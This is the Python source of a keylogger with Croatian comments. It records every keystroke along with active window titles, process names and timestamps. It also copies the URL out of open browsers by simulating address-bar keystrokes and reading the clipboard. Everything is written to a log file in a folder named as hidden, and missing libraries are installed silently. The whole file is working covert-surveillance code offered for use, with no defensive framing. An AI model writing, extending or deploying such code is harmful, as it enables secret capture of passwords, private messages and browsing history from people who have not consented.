import subprocess # za instaliranje pynputa ukoliko nije instaliran
import sys        # za instaliranje pynputa ukoliko nije instaliran
import datetime
import time

try:
    from pynput import keyboard, mouse
    import pyautogui
    import pygetwindow as gw
    import pyperclip
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygetwindow"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    from pynput import keyboard, mouse
    import pyautogui
    import pygetwindow as gw
    import pyperclip

old_title = ""

class Keylogger:
    
##########################################################################################################################################

    def __init__(self, log_path):
        # Inicijalizacija putanje gdje će se čuvati log file
        self.log_path = log_path  
        self.char = ""  # Početna prazna varijabla

##########################################################################################################################################

    def on_press(key):
        try:
            if hasattr(key, 'vk') and 96 <= key.vk <= 111:
                if key.vk == 96:
                    keylogger.char += "0"
                elif key.vk == 97:
                    keylogger.char += "1"
                elif key.vk == 98:
                    keylogger.char += "2"
                elif key.vk == 99:
                    keylogger.char += "3"
                elif key.vk == 100:
                    keylogger.char += "4"
                elif key.vk == 101:
                    keylogger.char += "5"
                elif key.vk == 102:
                    keylogger.char += "6"
                elif key.vk == 103:
                    keylogger.char += "7"
                elif key.vk == 104:
                    keylogger.char += "8"
                elif key.vk == 105:
                    keylogger.char += "9"
                elif key.vk == 106:
                    keylogger.char += "*"
                elif key.vk == 107:
                    keylogger.char += "+"
                elif key.vk == 109:
                    keylogger.char += "-"
                elif key.vk == 110:
                    keylogger.char += ","
                elif key.vk == 111:
                    keylogger.char += "/"
            else:
                keylogger.char += format(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                keylogger.char += " "
            elif key == keyboard.Key.enter:
                keylogger.char += "\n"
            elif key == keyboard.Key.tab:
                keylogger.char += "\t"
            elif key == keyboard.Key.cmd:
                keylogger.char += "⊞"
            elif key == keyboard.Key.backspace:
                keylogger.delete_last()
        return False

##########################################################################################################################################

    def on_click(x,y,button,pressed):
        if pressed:
            keylogger.detect_window_change()
            return False

##########################################################################################################################################

    def update_log(self):
        # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
        with open(self.log_path, "a", encoding="utf-8") as file:
            file.write(self.char)
            self.char = ""  # Resetira varijablu nakon što je upisan znak kako nebi došlo do dupliciranja

##########################################################################################################################################

    def delete_last(self):
        # Otvori file u režimu čitanja (read), kako bi se pročitao content file-a
        with open(self.log_path, "r", encoding="utf-8") as file:
            content = file.read()
            if content: # ako nije prazan
                content = content[:-1] # cijeli sadrzaj txt datoteke se kopira osim posljednjeg znaka
            else:
                pass
            with open(self.log_path, "w", encoding="utf-8") as file:
                file.write(content) # zapisi novi sadrzaj

##########################################################################################################################################

    def start(self):
        while True:
            self.detect_window_change()
            with keyboard.Listener(on_press=Keylogger.on_press) as listener:
                self.detect_window_change()
                self.update_log()
                listener.join()

##########################################################################################################################################

    def detect_window_change(self):

        new_title = gw.getActiveWindowTitle()
        global old_title

        if old_title == new_title:
            pass
        elif new_title == "" or new_title == "Task Switching":
            pass
        else:
            with open(self.log_path, "a", encoding="utf-8") as file:
                            file.write("\n\n__________________________________________________________________________________________________\n"+new_title+"   |"+self.get_imagename_from_PID()+"|   " + str(datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')) + "\nURL: " + self.get_URL() +"\n"+"--------------------------------------------------------------------------------------------------"+"\n")
            old_title = new_title

##########################################################################################################################################

    def get_imagename_from_PID(self):

        title = gw.getActiveWindowTitle()

        command = f'tasklist /fi "windowtitle eq {title}" /fo "list"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout  # Output iz cmd-a
        if not output.__contains__('INFO: No tasks are running which match the specified criteria.'):
            print(output)
            active_window_name = output[15:].split('\n')[0] # zanemarujem prvih 15 charactera jer je to samo naslov, a splitam po novom redu
                                                            # i zanemarujem ostatak jer mi nije potreban
        else:
            active_window_name = gw.getActiveWindowTitle()
        return active_window_name
    
##########################################################################################################################################

    def get_URL(self):

        browsers = ["brave.exe","msedge.exe","chrome.exe","opera.exe","operagx","firefox.exe"]

        if self.get_imagename_from_PID() in browsers:
            pyautogui.hotkey('ctrl','l')
            pyautogui.hotkey('ctrl','c')
            pyautogui.press('esc')
            pyautogui.press('esc')
            pyautogui.press('esc')
            time.sleep(0.01)
            url = pyperclip.paste()
        else:
            url = ""
        return url

##########################################################################################################################################

log_path = r"c:\skriveni_folder\log.txt"  # Putanja na kojoj će se čuvati log file

# Kreira instancu klasa i pokreće keylogger
keylogger = Keylogger(log_path)
keylogger.start()